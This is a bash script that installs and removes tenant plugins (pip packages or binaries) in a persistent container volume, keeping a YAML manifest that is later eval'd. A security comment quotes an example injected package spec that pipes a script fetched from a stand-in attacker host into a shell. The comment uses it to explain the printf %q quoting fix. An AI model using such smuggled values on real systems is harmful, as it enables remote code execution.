#!/usr/bin/env bash
# Install (or remove) a runtime plugin (pip package or standalone binary) at
# a location that survives `docker compose up --force-recreate`, and record
# it in this tenant's install manifest so a reconciliation pass can restore
# it later if needed (see reconcile-plugins.sh, run automatically by
# tenant-entrypoint.sh on every container start).
#
# Runs inside the tenant container, using /opt/data (the one mounted,
# persistent volume — see docs/architecture.md's "Tenant Plugin Persistence"
# and "What Gets Preserved on Upgrade" sections for why nothing outside it
# survives a recreate). This is the ONLY supported way for the tenant agent
# to add a new pip package or binary at runtime — never call pip/uv/apt or
# write into /opt/hermes/.venv directly; that venv is root-owned and
# read-only to the tenant agent by design (see Dockerfile), and mutating it
# live can crash the running gateway process, not just fail to persist.
#
# Usage:
#   tenant-install.sh pip    <package-spec> "<reason>"
#   tenant-install.sh binary <name> <download-url> "<reason>"
#   tenant-install.sh remove <name>
#   tenant-install.sh list
#
# Examples:
#   tenant-install.sh pip pypdf "owner asked for PDF text extraction"
#   tenant-install.sh binary jq https://github.com/jqlang/jq/releases/.../jq-linux-amd64 "owner asked for JSON filtering in shell steps"
#   tenant-install.sh remove pypdf
#   tenant-install.sh list

set -euo pipefail

DATA_DIR="${HERMES_HOME:-/opt/data}"
LAZY_TARGET="${HERMES_LAZY_INSTALL_TARGET:-$DATA_DIR/lazy-packages}"
BIN_TARGET="$DATA_DIR/.local/bin"
MANIFEST="$DATA_DIR/installed-plugins.yaml"
FORBIDDEN_PREFIX="/opt/hermes/.venv"

usage() {
  echo "Usage:"
  echo "  $0 pip    <package-spec> \"<reason>\""
  echo "  $0 binary <name> <download-url> \"<reason>\""
  echo "  $0 remove <name>"
  echo "  $0 list"
  exit 2
}

log()  { echo "[tenant-install] $1"; }
fail() { echo "[tenant-install] ERROR: $1" >&2; exit 1; }

# install_cmd is stored in the manifest and later fed straight to `eval` by
# reconcile-plugins.sh on every container start. The original install call
# below (`uv pip install ... "$PACKAGE"`) is already safely quoted, so a
# malicious PACKAGE spec can't break out THAT command — but install_cmd was
# previously built by interpolating $PACKAGE/$URL/$DEST UNQUOTED into a
# plain string for storage, and that string is what gets eval'd later. A
# spec like "pypdf; curl evil.example | sh" would pass the original quoted
# install call as one (failing) argument, then execute as two separate
# shell commands the next time reconcile-plugins.sh evals the stored
# string. The pre-existing double-quote/newline check in record_manifest
# does not catch this — it only protects the YAML manifest's own quoting,
# not eval's.
#
# Fixed by shell-quoting each tenant-supplied value with `printf %q` before
# it goes into install_cmd, rather than denylisting characters: a denylist
# broad enough to block ';', '|', '`', '$()', '<', '>' etc. also blocks
# legitimate pip version-constraint syntax (e.g. "pkg>=1.0,<2.0" needs '<'
# and '>'), so the fix has to be "make eval treat this as one opaque
# argument" rather than "forbid the characters real specs need." %q
# produces a token that reproduces the exact original string when the
# shell re-parses it — including any of the characters above — so eval
# can no longer interpret them as shell syntax.
shq() { printf '%q' "$1"; }

abi_tag() {
  # Captures the interpreter ABI so reconcile-plugins.sh can tell a
  # pip-installed package is stale after an image/interpreter upgrade,
  # the same staleness native lazy_deps guards against with its own stamp.
  local py="/opt/hermes/.venv/bin/python"
  [ -x "$py" ] || py="python3"
  "$py" -c 'import sys; print(f"cp{sys.version_info.major}{sys.version_info.minor}")' 2>/dev/null || echo "unknown"
}

# ---------------------------------------------------------------------------
# Manifest helpers
#
# These operate on whole "  - name: ..." blocks by copying raw lines rather
# than reconstructing field values, so they stay safe even though individual
# fields (reason, install_cmd, installed_paths) may contain shell-special
# characters that are NOT safe to use as a parsing delimiter.
# ---------------------------------------------------------------------------

# Rewrite $MANIFEST dropping every block whose "name:" exactly matches one of
# the given names. Used both to de-duplicate on reinstall (drop the old block
# before appending the new one) and to implement `remove`.
rewrite_manifest_excluding() {
  local tmp="$MANIFEST.tmp.$$"
  printf 'plugins:\n' > "$tmp"
  if [ -f "$MANIFEST" ]; then
    local buf="" cur_name="" skip=0
    while IFS= read -r line || [ -n "$line" ]; do
      case "$line" in
        "plugins:") continue ;;
        "  - name:"*)
          if [ -n "$buf" ] && [ "$skip" = "0" ]; then printf '%s' "$buf" >> "$tmp"; fi
          buf="$line"$'\n'
          cur_name="$(printf '%s' "$line" | sed -E 's/^  - name: *"?([^"]*)"?$/\1/')"
          skip=0
          for n in "$@"; do
            [ "$cur_name" = "$n" ] && skip=1
          done
          ;;
        *)
          buf="$buf$line"$'\n'
          ;;
      esac
    done < "$MANIFEST"
    if [ -n "$buf" ] && [ "$skip" = "0" ]; then printf '%s' "$buf" >> "$tmp"; fi
  fi
  mv "$tmp" "$MANIFEST"
}

# Look up one manifest entry by exact name. Prints "kind<TAB>target<TAB>installed_paths"
# and returns 0 if found, returns 1 if not found.
manifest_lookup() {
  local want_name="$1"
  local cur_name="" kind="" target="" installed_paths="" found=0
  [ -f "$MANIFEST" ] || return 1
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in
      "  - name:"*)
        [ "$found" = "1" ] && break
        cur_name="$(printf '%s' "$line" | sed -E 's/^  - name: *"?([^"]*)"?$/\1/')"
        kind="" target="" installed_paths=""
        [ "$cur_name" = "$want_name" ] && found=1
        ;;
      "    kind:"*)
        [ "$found" = "1" ] && kind="$(printf '%s' "$line" | sed -E 's/^    kind: *"?([^"]*)"?$/\1/')" ;;
      "    target:"*)
        [ "$found" = "1" ] && target="$(printf '%s' "$line" | sed -E 's/^    target: *"?([^"]*)"?$/\1/')" ;;
      "    installed_paths:"*)
        [ "$found" = "1" ] && installed_paths="$(printf '%s' "$line" | sed -E 's/^    installed_paths: *"?([^"]*)"?$/\1/')" ;;
    esac
  done < "$MANIFEST"
  [ "$found" = "1" ] || return 1
  printf '%s\t%s\t%s\n' "$kind" "$target" "$installed_paths"
}

# name kind target install_cmd reason [installed_paths]
# De-duplicates by dropping any prior block for the same name before
# appending the new one, so reinstalling never leaves stale duplicate blocks
# behind for reconcile-plugins.sh to process twice.
record_manifest() {
  local name="$1" kind="$2" target="$3" install_cmd="$4" reason="$5" installed_paths="${6:-}"
  case "$name$target$install_cmd$reason$installed_paths" in
    *'"'*|*$'\n'*) fail "install metadata cannot contain a double-quote or newline (name/target/reason/installed_paths)" ;;
  esac
  mkdir -p "$DATA_DIR"
  [ -f "$MANIFEST" ] || echo "plugins:" > "$MANIFEST"
  rewrite_manifest_excluding "$name"
  cat >> "$MANIFEST" <<EOF
  - name: "$name"
    kind: "$kind"
    target: "$target"
    install_cmd: "$install_cmd"
    python_abi: "$(abi_tag)"
    installed_at: "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    reason: "$reason"
    installed_paths: "$installed_paths"
EOF
  log "Recorded '$name' in $MANIFEST"
}

cmd_list() {
  [ "$#" -eq 0 ] || usage
  if [ ! -f "$MANIFEST" ]; then
    log "No manifest at $MANIFEST — nothing installed."
    return 0
  fi
  local name="" kind="" installed_at="" reason="" printed=0
  flush() {
    [ -n "$name" ] || return 0
    printf '%-24s %-8s installed_at=%-21s reason=%s\n' "$name" "$kind" "$installed_at" "$reason"
    printed=1
  }
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in
      "  - name:"*)
        flush
        name="$(printf '%s' "$line" | sed -E 's/^  - name: *"?([^"]*)"?$/\1/')"
        kind="" installed_at="" reason=""
        ;;
      "    kind:"*) kind="$(printf '%s' "$line" | sed -E 's/^    kind: *"?([^"]*)"?$/\1/')" ;;
      "    installed_at:"*) installed_at="$(printf '%s' "$line" | sed -E 's/^    installed_at: *"?([^"]*)"?$/\1/')" ;;
      "    reason:"*) reason="$(printf '%s' "$line" | sed -E 's/^    reason: *"?([^"]*)"?$/\1/')" ;;
    esac
  done < "$MANIFEST"
  flush
  [ "$printed" = "1" ] || log "No plugins recorded in $MANIFEST"
}

cmd_remove() {
  [ "$#" -eq 1 ] || usage
  local name="$1" lookup kind target installed_paths
  [ -f "$MANIFEST" ] || fail "no manifest at $MANIFEST — nothing installed"
  lookup="$(manifest_lookup "$name")" || fail "'$name' is not recorded in $MANIFEST"
  IFS=$'\t' read -r kind target installed_paths <<< "$lookup"

  case "$kind" in
    binary)
      case "$target" in
        "$BIN_TARGET"/*) rm -f -- "$target" ;;
        *) fail "refusing to remove '$target' for '$name' — outside $BIN_TARGET" ;;
      esac
      log "Removed binary '$name' ($target)"
      ;;
    pip)
      if [ -z "$installed_paths" ]; then
        fail "'$name' has no recorded installed_paths (installed by a tenant-install.sh predating per-file tracking) — refusing to blanket-delete $LAZY_TARGET since it may hold other packages' files. Remove the package's files under $LAZY_TARGET by hand, then re-run '$0 remove $name' to drop the manifest entry."
      fi
      eval "set -- $installed_paths"
      local rel target_path
      for rel in "$@"; do
        case "$rel" in
          ""|*/*|..|.) fail "refusing to remove suspicious path entry '$rel' recorded for '$name'" ;;
        esac
        target_path="$LAZY_TARGET/$rel"
        case "$target_path" in
          "$LAZY_TARGET"/*) rm -rf -- "$target_path" ;;
          *) fail "refusing to remove '$target_path' for '$name' — outside $LAZY_TARGET" ;;
        esac
      done
      log "Removed pip package '$name' (paths: $installed_paths) from $LAZY_TARGET"
      ;;
    *)
      fail "unknown kind '$kind' recorded for '$name' — remove the manifest entry by hand"
      ;;
  esac

  rewrite_manifest_excluding "$name"
  log "Dropped '$name' from $MANIFEST"
}

[ "$#" -ge 1 ] || usage
KIND="$1"
shift

case "$KIND" in
  pip)
    [ "$#" -eq 2 ] || usage
    PACKAGE="$1"
    REASON="$2"
    [ -n "$PACKAGE" ] || fail "package spec cannot be empty"
    mkdir -p "$LAZY_TARGET"
    # $PACKAGE is quoted via shq() (printf %q) rather than interpolated raw:
    # this string is stored in the manifest and eval'd verbatim by
    # reconcile-plugins.sh later, so any shell-special characters in a
    # package spec (';', '|', '$()', etc.) must survive as literal
    # characters at eval time, not be re-interpreted as shell syntax — see
    # the comment above shq()'s definition for why a character denylist
    # isn't the right fix here (it would also reject legitimate version
    # constraints like "pkg>=1.0,<2.0"). No embedded double-quotes from the
    # quoting itself: %q wraps in single quotes, so the record_manifest
    # double-quote check below still passes for ordinary specs.
    INSTALL_CMD="uv pip install --target $(shq "$LAZY_TARGET") --no-cache-dir $(shq "$PACKAGE")"
    # Validate manifest metadata BEFORE performing the install, not after.
    # Previously this check ran only inside record_manifest, called after
    # `uv pip install` had already succeeded — a name/reason containing a
    # double-quote or newline would abort the manifest write with the
    # package already downloaded and live on disk, leaving an installed but
    # unrecorded artifact that reconcile-plugins.sh has no knowledge of and
    # that troubleshoot-tenant.md's "check the manifest first" guidance
    # would incorrectly treat as never having gone through this script.
    case "$PACKAGE$REASON$INSTALL_CMD" in
      *'"'*|*$'\n'*) fail "package spec or reason cannot contain a double-quote or newline" ;;
    esac
    # Snapshot the target dir before install so we can record exactly which
    # top-level entries this install added — pip/uv have no "uninstall a
    # single package from a --target install" support, so `remove` needs
    # this list to know precisely what is safe to delete later without
    # touching any other package sharing the same --target directory.
    BEFORE_LISTING="$(ls -A "$LAZY_TARGET" 2>/dev/null || true)"
    log "Installing pip package '$PACKAGE' into $LAZY_TARGET"
    uv pip install --target "$LAZY_TARGET" --no-cache-dir "$PACKAGE" \
      || fail "pip install of '$PACKAGE' failed"
    AFTER_LISTING="$(ls -A "$LAZY_TARGET" 2>/dev/null || true)"
    NEW_PATHS="$(comm -13 <(printf '%s\n' "$BEFORE_LISTING" | sort) <(printf '%s\n' "$AFTER_LISTING" | sort))"
    # Merge with any installed_paths already recorded for this exact package
    # name. A reinstall of a package whose files are already on disk adds
    # nothing new (mkdir -p / pip overwrite in place), so NEW_PATHS alone
    # would be empty on a reinstall — without merging in the prior record,
    # record_manifest's dedupe-then-append would silently replace a correct
    # installed_paths list with an empty one, and `remove` would then refuse
    # to act on a package it can actually see on disk.
    OLD_PATHS_QUOTED=""
    OLD_LOOKUP="$(manifest_lookup "$PACKAGE" 2>/dev/null)" || OLD_LOOKUP=""
    if [ -n "$OLD_LOOKUP" ]; then
      IFS=$'\t' read -r _old_kind _old_target OLD_PATHS_QUOTED <<< "$OLD_LOOKUP"
    fi
    OLD_REL_NAMES=""
    if [ -n "$OLD_PATHS_QUOTED" ]; then
      eval "set -- $OLD_PATHS_QUOTED"
      for p in "$@"; do
        OLD_REL_NAMES="$OLD_REL_NAMES
$p"
      done
    fi
    INSTALLED_PATHS=""
    while IFS= read -r p; do
      [ -n "$p" ] || continue
      # Only keep entries that still exist on disk, so a path removed
      # outside this script (or by a previous partial failure) doesn't
      # linger in the manifest forever.
      [ -e "$LAZY_TARGET/$p" ] || continue
      case " $INSTALLED_PATHS " in
        *" $(shq "$p") "*) ;;  # already added (dedupe old vs new overlap)
        *) INSTALLED_PATHS="$INSTALLED_PATHS $(shq "$p")" ;;
      esac
    done <<< "$(printf '%s\n%s\n' "$NEW_PATHS" "$OLD_REL_NAMES" | sed '/^$/d' | sort -u)"
    INSTALLED_PATHS="${INSTALLED_PATHS# }"
    record_manifest "$PACKAGE" "pip" "$LAZY_TARGET" "$INSTALL_CMD" "$REASON" "$INSTALLED_PATHS"
    ;;
  binary)
    [ "$#" -eq 3 ] || usage
    NAME="$1"
    URL="$2"
    REASON="$3"
    [ -n "$NAME" ] || fail "binary name cannot be empty"
    [ -n "$URL" ]  || fail "download URL cannot be empty"
    case "$NAME" in
      */*) fail "binary name must not contain '/' (got '$NAME') — this installs a single file directly into $BIN_TARGET, not an arbitrary path" ;;
    esac
    DEST="$BIN_TARGET/$NAME"
    case "$DEST" in
      "$FORBIDDEN_PREFIX"*) fail "refusing to install into $FORBIDDEN_PREFIX — that runtime venv is off-limits, see comment at top of this script" ;;
    esac
    # $URL and $DEST quoted via shq() for the same reason as $PACKAGE above:
    # this string is eval'd later, not just parsed once here.
    INSTALL_CMD="curl -sSL $(shq "$URL") -o $(shq "$DEST") && chmod +x $(shq "$DEST")"
    # Validate BEFORE downloading — see the matching comment in the pip
    # branch above for why this ordering matters.
    case "$NAME$REASON$INSTALL_CMD" in
      *'"'*|*$'\n'*) fail "binary name or reason cannot contain a double-quote or newline" ;;
    esac
    mkdir -p "$BIN_TARGET"
    log "Installing binary '$NAME' to $DEST"
    curl -sSL "$URL" -o "$DEST" || fail "download of '$NAME' from $URL failed"
    chmod +x "$DEST"
    record_manifest "$NAME" "binary" "$DEST" "$INSTALL_CMD" "$REASON"
    ;;
  remove)
    cmd_remove "$@"
    exit 0
    ;;
  list)
    cmd_list "$@"
    exit 0
    ;;
  *)
    usage
    ;;
esac

log "Done. Available immediately in this session; persists across container recreation."
